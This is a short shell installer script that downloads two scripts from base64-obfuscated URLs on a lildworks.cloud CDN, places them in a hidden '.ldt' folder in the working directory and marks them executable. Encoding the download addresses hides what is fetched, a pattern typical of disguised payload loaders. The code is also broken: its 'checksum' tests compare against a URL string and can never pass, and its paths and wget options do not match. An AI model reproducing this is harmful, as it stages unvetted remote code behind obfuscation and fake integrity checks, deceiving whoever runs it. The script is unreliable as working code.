#!/bin/sh
http=""
workingDir="$PWD"
if [ ! "$(command -v curl)" = "" ]; then http="curl -sL"; fi
if [ ! "$(command -v wget)" = "" ]; then http="wget"; fi
mkdir -p /tmp/download-ldtw
$http $(echo aHR0cHM6Ly9jZG4ubGlsZHdvcmtzLmNsb3VkL2xkdC1jb21waWxlci5zaAo= | base64 --decode) -o /tmp/download-ldtw/bin/ldt-compiler.sh
$http $(echo aHR0cHM6Ly9jZG4ubGlsZHdvcmtzLmNsb3VkL2xkdC1sb2dnZXIuc2gK | base64 --decode) -o /tmp/download-ldtw/bin/ldt-logger.sh
if [ ! "$(cksum /tmp/download-ldtw/ldt-compiler.sh)" = "$http $(echo aHR0cHM6Ly9jZG4ubGlsZHdvcmtzLmNsb3VkL2xkdC1jb21waWxlci5zaAo= | base64 --decode) /bin/sh" ]; then echo "ERR: checksum is corrupted!" && exit 500; fi
if [ ! "$(cksum /tmp/download-ldtw/ldt-logger.sh)" = "$http $(echo aHR0cHM6Ly9jZG4ubGlsZHdvcmtzLmNsb3VkL2xkdC1jb21waWxlci5zaAo= | base64 --decode) /bin/sh" ]; then echo "ERR: checksum is corrupted!" && exit 500; fi
mkdir -p $workingDir/.ldt
cp -r /tmp/download-ldtw $workingDir/.ldt
chmod -R 755 $workingDir/.ldt/bin/*.sh
